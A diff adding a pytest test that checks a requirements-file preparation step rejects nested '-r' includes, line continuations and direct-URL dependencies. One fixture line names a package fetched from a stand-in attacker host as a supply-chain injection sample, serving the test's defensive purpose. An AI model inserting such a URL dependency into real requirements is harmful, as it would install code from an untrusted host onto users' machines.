@@ -55,3 +55,25 @@ def test_runtime_marker_and_duplicate_declarations_are_rejected(tmp_path):
 
     with pytest.raises(ValueError):
         module.prepare(source, tmp_path / "public-requirements.txt")
+
+
+@pytest.mark.parametrize(
+    "requirements",
+    [
+        "-r nested.txt\nmolecules-workspace-runtime==0.3.125\n",
+        "molecules-workspace-runtime==0.3.125 \\\n<1\n",
+        (
+            "molecules-workspace-runtime==0.3.125\n"
+            "other-package @ https://attacker.example/other.whl\n"
+        ),
+    ],
+)
+def test_pip_directives_continuations_and_direct_urls_are_rejected(
+    tmp_path, requirements
+):
+    module = _load_module()
+    source = tmp_path / "requirements.txt"
+    source.write_text(requirements)
+
+    with pytest.raises(ValueError):
+        module.prepare(source, tmp_path / "public-requirements.txt")
